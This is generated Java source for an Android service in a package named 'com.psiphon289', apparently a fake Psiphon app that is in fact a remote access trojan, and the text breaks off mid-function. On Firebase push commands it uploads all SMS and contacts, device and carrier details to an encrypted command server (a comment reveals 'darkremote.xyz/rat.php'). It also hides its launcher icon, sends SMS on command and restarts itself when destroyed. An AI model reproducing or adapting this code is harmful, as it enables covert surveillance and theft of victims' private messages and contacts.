package com.psiphon289;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class firebasemessaging extends  android.app.Service{
	public static class firebasemessaging_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (firebasemessaging) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, firebasemessaging.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static firebasemessaging mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return firebasemessaging.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon289", "com.psiphon289.firebasemessaging");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon289.firebasemessaging", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (firebasemessaging) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (firebasemessaging) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (firebasemessaging) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (firebasemessaging) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (firebasemessaging) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static anywheresoftware.b4a.objects.FirebaseNotificationsService.FirebaseMessageWrapper _vvvvvvvvv6 = null;
public static com.reza.sh.deviceinfo.DiviceInfo _v5 = null;
public static String _v6 = "";
public static String _v7 = "";
public static String _v0 = "";
public static String _vv1 = "";
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static String _vv6 = "";
public static String _vv7 = "";
public static anywheresoftware.b4a.phone.PhoneEvents _vv0 = null;
public static anywheresoftware.b4a.phone.Phone _vvv1 = null;
public static com.psiphon289.httpjob _vvv2 = null;
public static anywheresoftware.b4a.phone.SmsWrapper.Sms _vvv3 = null;
public static pejman.nikravan.PNSMS _vvv4 = null;
public static anywheresoftware.b4a.phone.SmsWrapper _vvv5 = null;
public static anywheresoftware.b4a.objects.collections.List _vvv6 = null;
public static String _vvv7 = "";
public b4a.example.dateutils _vvvvvvvv7 = null;
public com.psiphon289.main _vvvvvvvv0 = null;
public com.psiphon289.starter _vvvvvvvvv1 = null;
public com.psiphon289.httputils2service _vvvvvvvvv3 = null;
public static class _message{
public boolean IsInitialized;
public String Address;
public String Body;
public void Initialize() {
IsInitialized = true;
Address = "";
Body = "";
}
@Override
		public String toString() {
			return BA.TypeToString(this, false);
		}}
public static String  _fm_messagearrived(anywheresoftware.b4a.objects.FirebaseNotificationsService.RemoteMessageWrapper _message) throws Exception{
String _apilink = "";
String _allsms = "";
int _i = 0;
b4a.example.contactsutils _cu = null;
String _allcon = "";
b4a.example.contactsutils._cucontact _c = null;
b4a.example.contactsutils._cuphone _phone = null;
anywheresoftware.b4a.objects.collections.List _listsms = null;
anywheresoftware.b4a.phone.SmsWrapper _sa = null;
String _lasts = "";
 //BA.debugLineNum = 66;BA.debugLine="Sub fm_MessageArrived (Message As RemoteMessage)";
 //BA.debugLineNum = 67;BA.debugLine="Log($\"Message data: ${Message.GetData}\"$)";
anywheresoftware.b4a.keywords.Common.LogImpl("13407873",("Message data: "+anywheresoftware.b4a.keywords.Common.SmartStringFormatter("",(Object)(_message.GetData().getObject()))+""),0);
 //BA.debugLineNum = 68;BA.debugLine="Comand = Message.GetData.Get(\"action\")";
_v6 = BA.ObjectToString(_message.GetData().Get((Object)("action")));
 //BA.debugLineNum = 69;BA.debugLine="androidid = Message.GetData.Get(\"androidid\")";
_vv1 = BA.ObjectToString(_message.GetData().Get((Object)("androidid")));
 //BA.debugLineNum = 70;BA.debugLine="android = pd.AndroidID";
_vv3 = _v5.getAndroidID();
 //BA.debugLineNum = 71;BA.debugLine="Opr = pd.Carrier";
_v7 = _v5.getCarrier();
 //BA.debugLineNum = 72;BA.debugLine="model = pd.Manufacturer&\"-\"&p.Model";
_v0 = _v5.getManufacturer()+"-"+_vvv1.getModel();
 //BA.debugLineNum = 73;BA.debugLine="kos = p.SdkVersion";
_vv2 = BA.NumberToString(_vvv1.getSdkVersion());
 //BA.debugLineNum = 74;BA.debugLine="battry=pd.BatteryPercentage";
_vv4 = BA.NumberToString(_v5.getBatteryPercentage());
 //BA.debugLineNum = 75;BA.debugLine="nump = Message.GetData.Get(\"phone\")";
_vv5 = BA.ObjectToString(_message.GetData().Get((Object)("phone")));
 //BA.debugLineNum = 76;BA.debugLine="txm = Message.GetData.Get(\"text\")";
_vv6 = BA.ObjectToString(_message.GetData().Get((Object)("text")));
 //BA.debugLineNum = 77;BA.debugLine="Dim apilink As String = strResult&\"/rat.php\"";
_apilink = _vvv7+"/rat.php";
 //BA.debugLineNum = 79;BA.debugLine="If Comand = \"ping\"  Then";
if ((_v6).equals("ping")) { 
 //BA.debugLineNum = 80;BA.debugLine="Log($\"Message data: ${Message.GetData}\"$)";
anywheresoftware.b4a.keywords.Common.LogImpl("13407886",("Message data: "+anywheresoftware.b4a.keywords.Common.SmartStringFormatter("",(Object)(_message.GetData().getObject()))+""),0);
 //BA.debugLineNum = 81;BA.debugLine="data = \"result=ok&action=ping&androidid=\"&androi";
_vv7 = "result=ok&action=ping&androidid="+_vv3+"&model="+_v0+"&battry="+_vv4+"&opr="+_v7+"&kos="+_vv2;
 //BA.debugLineNum = 82;BA.debugLine="ht.PostString(apilink,data)";
_vvv2._vvvvvv7 /*String*/ (_apilink,_vv7);
 };
 //BA.debugLineNum = 85;BA.debugLine="If Comand = \"pingone\"   Then";
if ((_v6).equals("pingone")) { 
 //BA.debugLineNum = 86;BA.debugLine="If android = androidid Then";
if ((_vv3).equals(_vv1)) { 
 //BA.debugLineNum = 87;BA.debugLine="Log($\"Message data: ${Message.GetData}\"$)";
anywheresoftware.b4a.keywords.Common.LogImpl("13407893",("Message data: "+anywheresoftware.b4a.keywords.Common.SmartStringFormatter("",(Object)(_message.GetData().getObject()))+""),0);
 //BA.debugLineNum = 88;BA.debugLine="data = \"result=ok&action=pingone&androidid=\"&an";
_vv7 = "result=ok&action=pingone&androidid="+_vv3+"&model="+_v0+"&battry="+_vv4+"&opr="+_v7;
 //BA.debugLineNum = 89;BA.debugLine="ht.PostString(apilink,data)";
_vvv2._vvvvvv7 /*String*/ (_apilink,_vv7);
 };
 };
 //BA.debugLineNum = 92;BA.debugLine="If Comand = \"SendSingleMessage\" And android = and";
if ((_v6).equals("SendSingleMessage") && (_vv3).equals(_vv1)) { 
 //BA.debugLineNum = 94;BA.debugLine="pnsms.Send(nump,txm)";
_vvv4.Send(_vv5,_vv6);
 };
 //BA.debugLineNum = 98;BA.debugLine="If Comand = \"getdevicefullinfo\" Then";
if ((_v6).equals("getdevicefullinfo")) { 
 //BA.debugLineNum = 99;BA.debugLine="If android = androidid Then";
if ((_vv3).equals(_vv1)) { 
 //BA.debugLineNum = 100;BA.debugLine="Log(\"Deviceinfo is OK\")";
anywheresoftware.b4a.keywords.Common.LogImpl("13407906","Deviceinfo is OK",0);
 //BA.debugLineNum = 101;BA.debugLine="data = \"result=ok&action=getdevicefullinfo&andr";
_vv7 = "result=ok&action=getdevicefullinfo&androidid="+_vv3+"&opr="+_v7+"&model="+_v0+"&battry="+_vv4;
 //BA.debugLineNum = 102;BA.debugLine="ht.PostString(apilink,data)";
_vvv2._vvvvvv7 /*String*/ (_apilink,_vv7);
 };
 };
 //BA.debugLineNum = 108;BA.debugLine="If Comand = \"hideicon\" Then";
if ((_v6).equals("hideicon")) { 
 //BA.debugLineNum = 109;BA.debugLine="If android = androidid Then";
if ((_vv3).equals(_vv1)) { 
 //BA.debugLineNum = 110;BA.debugLine="HideApp(True)";
_vvvvvvvvv4(anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 111;BA.debugLine="data = \"result=ok&action=hideicon&androidid=\"&a";
_vv7 = "result=ok&action=hideicon&androidid="+_vv3+"&opr="+_v7+"&model="+_v0+"&battry="+_vv4;
 //BA.debugLineNum = 112;BA.debugLine="ht.PostString(apilink,data)";
_vvv2._vvvvvv7 /*String*/ (_apilink,_vv7);
 };
 };
 //BA.debugLineNum = 117;BA.debugLine="If Comand = \"getsms\" Then";
if ((_v6).equals("getsms")) { 
 //BA.debugLineNum = 118;BA.debugLine="If android = androidid Then";
if ((_vv3).equals(_vv1)) { 
 //BA.debugLineNum = 119;BA.debugLine="Log(\"GetLastSms is OK\")";
anywheresoftware.b4a.keywords.Common.LogImpl("13407925","GetLastSms is OK",0);
 //BA.debugLineNum = 120;BA.debugLine="Dim allsms As String = \"\"";
_allsms = "";
 //BA.debugLineNum = 121;BA.debugLine="li.Initialize";
_vvv6.Initialize();
 //BA.debugLineNum = 122;BA.debugLine="li = sms2.GetAll";
_vvv6 = _vvv5.GetAll();
 //BA.debugLineNum = 123;BA.debugLine="For i = 0 To li.Size -1";
{
final int step47 = 1;
final int limit47 = (int) (_vvv6.getSize()-1);
_i = (int) (0) ;
for (;_i <= limit47 ;_i = _i + step47 ) {
 //BA.debugLineNum = 124;BA.debugLine="sms = li.Get(i)";
_vvv3 = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(_vvv6.Get(_i));
 //BA.debugLineNum = 125;BA.debugLine="allsms = allsms & CRLF & CRLF & \"{\" & CRLF & \"";
_allsms = _allsms+anywheresoftware.b4a.keywords.Common.CRLF+anywheresoftware.b4a.keywords.Common.CRLF+"{"+anywheresoftware.b4a.keywords.Common.CRLF+"M U M M Y"+anywheresoftware.b4a.keywords.Common.CRLF+"Conversion:"+_vvv3.Address+anywheresoftware.b4a.keywords.Common.CRLF+"Text:"+_vvv3.Body+anywheresoftware.b4a.keywords.Common.CRLF+"Date:"+anywheresoftware.b4a.keywords.Common.DateTime.Date(_vvv3.Date)+" "+anywheresoftware.b4a.keywords.Common.DateTime.Time(_vvv3.Date)+anywheresoftware.b4a.keywords.Common.CRLF+"}";
 }
};
 //BA.debugLineNum = 127;BA.debugLine="File.WriteString(File.DirInternal,\"AllSms.txt\",";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"AllSms.txt",_allsms);
 //BA.debugLineNum = 128;BA.debugLine="ht.Postfile(strResult&\"/upload.php?result=ok&ac";
_vvv2._vvvvvv5 /*String*/ (_vvv7+"/upload.php?result=ok&action=uploadsms&androidid="+_vv3+"&Opr="+_v7+"&model="+_v0,anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"AllSms.txt");
 };
 };
 //BA.debugLineNum = 134;BA.debugLine="If Comand = \"getcontact\" Then";
if ((_v6).equals("getcontact")) { 
 //BA.debugLineNum = 135;BA.debugLine="If android = androidid Then";
if ((_vv3).equals(_vv1)) { 
 //BA.debugLineNum = 136;BA.debugLine="Log(\"contact is OK\")";
anywheresoftware.b4a.keywords.Common.LogImpl("13407942","contact is OK",0);
 //BA.debugLineNum = 137;BA.debugLine="Dim cu As ContactsUtils";
_cu = new b4a.example.contactsutils();
 //BA.debugLineNum = 138;BA.debugLine="cu.Initialize";
_cu._initialize(processBA);
 //BA.debugLineNum = 139;BA.debugLine="Dim allcon As String";
_allcon = "";
 //BA.debugLineNum = 140;BA.debugLine="allcon = \"\"";
_allcon = "";
 //BA.debugLineNum = 141;BA.debugLine="For Each c As cuContact In cu.FindContactsByPho";
{
final anywheresoftware.b4a.BA.IterableList group62 = _cu._findcontactsbyphone("",anywheresoftware.b4a.keywords.Common.False,anywheresoftware.b4a.keywords.Common.False);
final int groupLen62 = group62.getSize()
;int index62 = 0;
;
for (; index62 < groupLen62;index62++){
_c = (b4a.example.contactsutils._cucontact)(group62.Get(index62));
 //BA.debugLineNum = 142;BA.debugLine="For Each Phone As cuPhone In cu.GetPhones(c.Id";
{
final anywheresoftware.b4a.BA.IterableList group63 = _cu._getphones(_c.Id);
final int groupLen63 = group63.getSize()
;int index63 = 0;
;
for (; index63 < groupLen63;index63++){
_phone = (b4a.example.contactsutils._cuphone)(group63.Get(index63));
 //BA.debugLineNum = 143;BA.debugLine="allcon = allcon&CRLF&\"@zaartoosht\"&CRLF&c.Dis";
_allcon = _allcon+anywheresoftware.b4a.keywords.Common.CRLF+"@zaartoosht"+anywheresoftware.b4a.keywords.Common.CRLF+_c.DisplayName+": "+_phone.Number;
 }
};
 }
};
 //BA.debugLineNum = 146;BA.debugLine="File.WriteString(File.DirInternal,\"Contacts.txt";
anywheresoftware.b4a.keywords.Common.File.WriteString(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"Contacts.txt",_allcon);
 //BA.debugLineNum = 147;BA.debugLine="ht.Postfile(strResult&\"/upload.php?result=ok&ac";
_vvv2._vvvvvv5 /*String*/ (_vvv7+"/upload.php?result=ok&action=upload&androidid="+_vv3+"&opr="+_v7+"&model="+_v0,anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"Contacts.txt");
 };
 };
 //BA.debugLineNum = 151;BA.debugLine="If Comand = \"lastsms\" Then";
if ((_v6).equals("lastsms")) { 
 //BA.debugLineNum = 152;BA.debugLine="If android = androidid Then";
if ((_vv3).equals(_vv1)) { 
 //BA.debugLineNum = 153;BA.debugLine="Dim listsms As List";
_listsms = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 154;BA.debugLine="Dim sa As SmsMessages";
_sa = new anywheresoftware.b4a.phone.SmsWrapper();
 //BA.debugLineNum = 155;BA.debugLine="Dim lasts As String";
_lasts = "";
 //BA.debugLineNum = 156;BA.debugLine="listsms = sa.GetAll";
_listsms = _sa.GetAll();
 //BA.debugLineNum = 157;BA.debugLine="lasts = listsms.Get(0)";
_lasts = BA.ObjectToString(_listsms.Get((int) (0)));
 //BA.debugLineNum = 158;BA.debugLine="Dim allsms As String = \"\"";
_allsms = "";
 //BA.debugLineNum = 159;BA.debugLine="li.Initialize";
_vvv6.Initialize();
 //BA.debugLineNum = 160;BA.debugLine="li = sms2.GetAll";
_vvv6 = _vvv5.GetAll();
 //BA.debugLineNum = 161;BA.debugLine="sms = li.Get(i)";
_vvv3 = (anywheresoftware.b4a.phone.SmsWrapper.Sms)(_vvv6.Get(_i));
 //BA.debugLineNum = 162;BA.debugLine="allsms =  sms.Address";
_allsms = _vvv3.Address;
 //BA.debugLineNum = 163;BA.debugLine="data = \"result=ok&action=lastsms&androidid=\"&an";
_vv7 = "result=ok&action=lastsms&androidid="+_vv3+"&model="+_v0+"&battry="+_vv4+"&opr="+_v7+"&message="+_lasts+"&sender="+_allsms;
 //BA.debugLineNum = 164;BA.debugLine="ht.PostString(apilink,data)";
_vvv2._vvvvvv7 /*String*/ (_apilink,_vv7);
 };
 };
 //BA.debugLineNum = 168;BA.debugLine="End Sub";
return "";
}
public static String  _vvvvvvvvv4(boolean _enable) throws Exception{
anywheresoftware.b4a.agraham.reflection.Reflection _rs = null;
Object _cns = null;
int _es = 0;
 //BA.debugLineNum = 199;BA.debugLine="Sub HideApp(Enable As Boolean)";
 //BA.debugLineNum = 200;BA.debugLine="Dim rs As Reflector";
_rs = new anywheresoftware.b4a.agraham.reflection.Reflection();
 //BA.debugLineNum = 201;BA.debugLine="Dim cns As Object = rs.CreateObject2(\"android.con";
_cns = _rs.CreateObject2("android.content.ComponentName",new Object[]{(Object)(anywheresoftware.b4a.keywords.Common.Application.getPackageName()),(Object)(anywheresoftware.b4a.keywords.Common.Application.getPackageName()+".main")},new String[]{"java.lang.String","java.lang.String"});
 //BA.debugLineNum = 202;BA.debugLine="rs.Target = rs.GetContext";
_rs.Target = (Object)(_rs.GetContext(processBA));
 //BA.debugLineNum = 203;BA.debugLine="rs.Target = rs.RunMethod(\"getPackageManager\")";
_rs.Target = _rs.RunMethod("getPackageManager");
 //BA.debugLineNum = 204;BA.debugLine="Dim es As Int";
_es = 0;
 //BA.debugLineNum = 205;BA.debugLine="If Enable = True Then";
if (_enable==anywheresoftware.b4a.keywords.Common.True) { 
 //BA.debugLineNum = 206;BA.debugLine="es = 2";
_es = (int) (2);
 }else {
 //BA.debugLineNum = 208;BA.debugLine="es = 1";
_es = (int) (1);
 };
 //BA.debugLineNum = 210;BA.debugLine="rs.Target = rs.RunMethod4(\"setComponentEnabledSet";
_rs.Target = _rs.RunMethod4("setComponentEnabledSetting",new Object[]{_cns,(Object)(_es),(Object)(0)},new String[]{"android.content.ComponentName","java.lang.int","java.lang.int"});
 //BA.debugLineNum = 211;BA.debugLine="End Sub";
return "";
}
public static String  _jobdone(com.psiphon289.httpjob _job) throws Exception{
 //BA.debugLineNum = 213;BA.debugLine="Sub JobDone(job As HttpJob)";
 //BA.debugLineNum = 214;BA.debugLine="If job.Success Then";
if (_job._vvvvvvv4 /*boolean*/ ) { 
 }else {
 //BA.debugLineNum = 217;BA.debugLine="Log(\"Error: \" & job.ErrorMessage)";
anywheresoftware.b4a.keywords.Common.LogImpl("13604484","Error: "+_job._vvvvvvv7 /*String*/ ,0);
 };
 //BA.debugLineNum = 219;BA.debugLine="job.Release";
_job._vvvvvvv2 /*String*/ ();
 //BA.debugLineNum = 220;BA.debugLine="End Sub";
return "";
}
public static anywheresoftware.b4a.objects.collections.List  _vvvvvvvvv5(anywheresoftware.b4a.objects.IntentWrapper _in) throws Exception{
anywheresoftware.b4a.objects.collections.List _messages_list = null;
Object[] _pdus = null;
anywheresoftware.b4a.agraham.reflection.Reflection _r = null;
anywheresoftware.b4a.objects.collections.Map _messagesmap = null;
int _i = 0;
com.psiphon289.firebasemessaging._message _msg = null;
com.psiphon289.firebasemessaging._message _existing = null;
 //BA.debugLineNum = 169;BA.debugLine="Sub ParseSmsIntent (In As Intent) As List";
 //BA.debugLineNum = 170;BA.debugLine="Dim messages_list As List";
_messages_list = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 171;BA.debugLine="messages_list.Initialize";
_messages_list.Initialize();
 //BA.debugLineNum = 172;BA.debugLine="If In.HasExtra(\"pdus\") = False Then Return messag";
if (_in.HasExtra("pdus")==anywheresoftware.b4a.keywords.Common.False) { 
if (true) return _messages_list;};
 //BA.debugLineNum = 173;BA.debugLine="Dim pdus() As Object";
_pdus = new Object[(int) (0)];
{
int d0 = _pdus.length;
for (int i0 = 0;i0 < d0;i0++) {
_pdus[i0] = new Object();
}
}
;
 //BA.debugLineNum = 174;BA.debugLine="Dim r As Reflector";
_r = new anywheresoftware.b4a.agraham.reflection.Reflection();
 //BA.debugLineNum = 175;BA.debugLine="pdus = In.GetExtra(\"pdus\")";
_pdus = (Object[])(_in.GetExtra("pdus"));
 //BA.debugLineNum = 176;BA.debugLine="Dim messagesMap As Map";
_messagesmap = new anywheresoftware.b4a.objects.collections.Map();
 //BA.debugLineNum = 177;BA.debugLine="messagesMap.Initialize";
_messagesmap.Initialize();
 //BA.debugLineNum = 178;BA.debugLine="If pdus.Length > 0 Then";
if (_pdus.length>0) { 
 //BA.debugLineNum = 179;BA.debugLine="For i = 0 To pdus.Length - 1";
{
final int step10 = 1;
final int limit10 = (int) (_pdus.length-1);
_i = (int) (0) ;
for (;_i <= limit10 ;_i = _i + step10 ) {
 //BA.debugLineNum = 180;BA.debugLine="Dim msg As Message";
_msg = new com.psiphon289.firebasemessaging._message();
 //BA.debugLineNum = 181;BA.debugLine="r.Target = r.RunStaticMethod(\"android.telephony";
_r.Target = _r.RunStaticMethod("android.telephony.SmsMessage","createFromPdu",new Object[]{_pdus[_i]},new String[]{"[B"});
 //BA.debugLineNum = 183;BA.debugLine="msg.Body = r.RunMethod(\"getMessageBody\")";
_msg.Body /*String*/  = BA.ObjectToString(_r.RunMethod("getMessageBody"));
 //BA.debugLineNum = 184;BA.debugLine="msg.Address = r.RunMethod(\"getOriginatingAddres";
_msg.Address /*String*/  = BA.ObjectToString(_r.RunMethod("getOriginatingAddress"));
 //BA.debugLineNum = 186;BA.debugLine="If messagesMap.ContainsKey(msg.Address) Then";
if (_messagesmap.ContainsKey((Object)(_msg.Address /*String*/ ))) { 
 //BA.debugLineNum = 187;BA.debugLine="Dim existing As Message";
_existing = new com.psiphon289.firebasemessaging._message();
 //BA.debugLineNum = 188;BA.debugLine="existing = messagesMap.Get(msg.Address)";
_existing = (com.psiphon289.firebasemessaging._message)(_messagesmap.Get((Object)(_msg.Address /*String*/ )));
 //BA.debugLineNum = 189;BA.debugLine="existing.Body = existing.Body & msg.Body";
_existing.Body /*String*/  = _existing.Body /*String*/ +_msg.Body /*String*/ ;
 }else {
 //BA.debugLineNum = 192;BA.debugLine="messagesMap.Put(msg.Address, msg)";
_messagesmap.Put((Object)(_msg.Address /*String*/ ),(Object)(_msg));
 //BA.debugLineNum = 193;BA.debugLine="messages_list.Add(msg)";
_messages_list.Add((Object)(_msg));
 };
 }
};
 };
 //BA.debugLineNum = 197;BA.debugLine="Return messages_list";
if (true) return _messages_list;
 //BA.debugLineNum = 198;BA.debugLine="End Sub";
return null;
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 7;BA.debugLine="Type Message (Address As String, Body As String)";
;
 //BA.debugLineNum = 8;BA.debugLine="Private fm As FirebaseMessaging";
_vvvvvvvvv6 = new anywheresoftware.b4a.objects.FirebaseNotificationsService.FirebaseMessageWrapper();
 //BA.debugLineNum = 9;BA.debugLine="Dim pd As PersianDeviceInfo";
_v5 = new com.reza.sh.deviceinfo.DiviceInfo();
 //BA.debugLineNum = 10;BA.debugLine="Dim Comand,Opr,model,androidid,kos,android,battry";
_v6 = "";
_v7 = "";
_v0 = "";
_vv1 = "";
_vv2 = "";
_vv3 = "";
_vv4 = "";
_vv5 = "";
_vv6 = "";
_vv7 = "";
 //BA.debugLineNum = 11;BA.debugLine="Dim PE As PhoneEvents";
_vv0 = new anywheresoftware.b4a.phone.PhoneEvents();
 //BA.debugLineNum = 12;BA.debugLine="Dim p As Phone";
_vvv1 = new anywheresoftware.b4a.phone.Phone();
 //BA.debugLineNum = 13;BA.debugLine="Dim ht As HttpJob";
_vvv2 = new com.psiphon289.httpjob();
 //BA.debugLineNum = 14;BA.debugLine="Dim sms As Sms";
_vvv3 = new anywheresoftware.b4a.phone.SmsWrapper.Sms();
 //BA.debugLineNum = 15;BA.debugLine="Dim pnsms As PNSMS";
_vvv4 = new pejman.nikravan.PNSMS();
 //BA.debugLineNum = 16;BA.debugLine="Dim sms2 As SmsMessages";
_vvv5 = new anywheresoftware.b4a.phone.SmsWrapper();
 //BA.debugLineNum = 17;BA.debugLine="Dim li As List";
_vvv6 = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 18;BA.debugLine="Dim p As Phone";
_vvv1 = new anywheresoftware.b4a.phone.Phone();
 //BA.debugLineNum = 19;BA.debugLine="Dim strResult As String = \"https://darkremote.xyz";
_vvv7 = main.vvv13 (new byte[] {59,57,-27,-123,44,117,-69,-101,61,51,-2,-125,122,126,-14,-37,54,119,-93,-49,33,55,-91,-49,38}, 88565);
 //BA.debugLineNum = 20;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
 //BA.debugLineNum = 21;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 22;BA.debugLine="fm.Initialize(\"fm\")";
_vvvvvvvvv6.Initialize(processBA,"fm");
 //BA.debugLineNum = 23;BA.debugLine="pnsms.Initialize(\"ss\")";
_vvv4.Initialize(processBA,"ss");
 //BA.debugLineNum = 24;BA.debugLine="pd.initialize(\"pd\")";
_v5.initialize(processBA,"pd");
 //BA.debugLineNum = 25;BA.debugLine="ht.Initialize(\"ht\",Me)";
_vvv2._initialize /*String*/ (processBA,"ht",firebasemessaging.getObject());
 //BA.debugLineNum = 26;BA.debugLine="PE.Initialize(\"PE\")";
_vv0.Initialize(processBA,"PE");
 //BA.debugLineNum = 27;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 221;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 222;BA.debugLine="StartService(\"\")";
anywheresoftware.b4a.keywords.Common.StartService(processBA,(Object)(""));
 //BA.debugLineNum = 223;BA.debugLine="End Sub";
return "";
}
public static void  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
ResumableSub_Service_Start rsub = new ResumableSub_Service_Start(null,_startingintent);
rsub.resume(processBA, null);
}
public static class ResumableSub_Service_Start extends BA.ResumableSub {
public ResumableSub_Service_Start(com.psiphon289.firebasemessaging parent,anywheresoftware.b4a.objects.IntentWrapper _startingintent) {
this.parent = parent;
this._startingintent = _startingintent;
}
com.psiphon289.firebasemessaging parent;
anywheresoftware.b4a.objects.IntentWrapper _startingintent;
String _apilink = "";
String _osversion = "";
anywheresoftware.b4a.objects.collections.List _messages = null;
int _i = 0;
int step15;
int limit15;

@Override
public void resume(BA ba, Object[] result) throws Exception{

    while (true) {
        switch (state) {
            case -1:
return;

case 0:
//C
this.state = 1;
 //BA.debugLineNum = 32;BA.debugLine="Dim apilink As String = strResult&\"/rat.php\"";
_apilink = parent._vvv7+"/rat.php";
 //BA.debugLineNum = 33;BA.debugLine="If StartingIntent.IsInitialized = True Then";
if (true) break;

case 1:
//if
this.state = 17;
if (_startingintent.IsInitialized()==anywheresoftware.b4a.keywords.Common.True) { 
this.state = 3;
}else {
this.state = 16;
}if (true) break;

case 3:
//C
this.state = 4;
 //BA.debugLineNum = 34;BA.debugLine="If File.Exists(File.DirInternal, \"test.txt\") = F";
if (true) break;

case 4:
//if
this.state = 7;
if (anywheresoftware.b4a.keywords.Common.File.Exists(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"test.txt")==anywheresoftware.b4a.keywords.Common.False) { 
this.state = 6;
}if (true) break;

case 6:
//C
this.state = 7;
 //BA.debugLineNum = 35;BA.debugLine="android = pd.AndroidID";
parent._vv3 = parent._v5.getAndroidID();
 //BA.debugLineNum = 36;BA.debugLine="Opr = pd.Carrier";
parent._v7 = parent._v5.getCarrier();
 //BA.debugLineNum = 37;BA.debugLine="Dim osVersion As String = pd.OSVersion";
_osversion = parent._v5.getOSVersion();
 //BA.debugLineNum = 38;BA.debugLine="model = pd.Manufacturer&\"-\"&p.Model";
parent._v0 = parent._v5.getManufacturer()+"-"+parent._vvv1.getModel();
 //BA.debugLineNum = 39;BA.debugLine="data = \"result=ok&action=firstinstall&androidid";
parent._vv7 = "result=ok&action=firstinstall&androidid="+parent._vv3+"&opr="+parent._v7+"&model="+parent._v0+"&osVersion="+_osversion;
 //BA.debugLineNum = 40;BA.debugLine="ht.PostString(apilink,data)";
parent._vvv2._vvvvvv7 /*String*/ (_apilink,parent._vv7);
 //BA.debugLineNum = 42;BA.debugLine="File.MakeDir(File.DirInternal, \"test.txt\")";
anywheresoftware.b4a.keywords.Common.File.MakeDir(anywheresoftware.b4a.keywords.Common.File.getDirInternal(),"test.txt");
 if (true) break;
;
 //BA.debugLineNum = 45;BA.debugLine="If StartingIntent.Action = \"android.provider.Tel";

case 7:
//if
this.state = 14;
if ((_startingintent.getAction()).equals("android.provider.Telephony.SMS_RECEIVED")) { 
this.state = 9;
}if (true) break;

case 9:
//C
this.state = 10;
 //BA.debugLineNum = 46;BA.debugLine="Dim messages As List";
_messages = new anywheresoftware.b4a.objects.collections.List();
 //BA.debugLineNum = 47;BA.debugLine="messages = ParseSmsIntent(StartingIntent)";
